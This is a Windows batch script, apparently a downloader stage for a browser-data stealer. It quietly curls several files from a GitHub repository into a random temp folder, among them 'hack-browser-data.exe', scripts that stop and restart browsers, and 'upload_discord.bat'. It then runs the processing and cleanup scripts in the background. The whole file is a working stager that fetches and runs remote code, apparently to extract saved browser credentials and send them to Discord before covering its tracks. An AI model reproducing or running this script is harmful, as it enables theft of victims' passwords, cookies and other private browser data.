REM =====================
REM get_bigboy.bat 
REM =====================
@echo off
setlocal EnableDelayedExpansion

REM Create temp directory with random name to avoid conflicts
set "tempdir=%TEMP%\bb_%RANDOM%"
mkdir "%tempdir%" 2>nul
cd "%tempdir%"

echo Downloading files...
curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat

REM Verify downloads
if not exist "process.bat" (
    echo Failed to download process.bat
    exit /b 1
)
if not exist "hack-browser-data.exe" (
    echo Failed to download hack-browser-data.exe
    exit /b 1
)

REM Create running flag
echo 1 > "%tempdir%\running.tmp"

REM Start the process and cleanup in background
start /B cmd /c "%tempdir%\process.bat"
start /B cmd /c "%tempdir%\cleanup.bat" "%tempdir%"

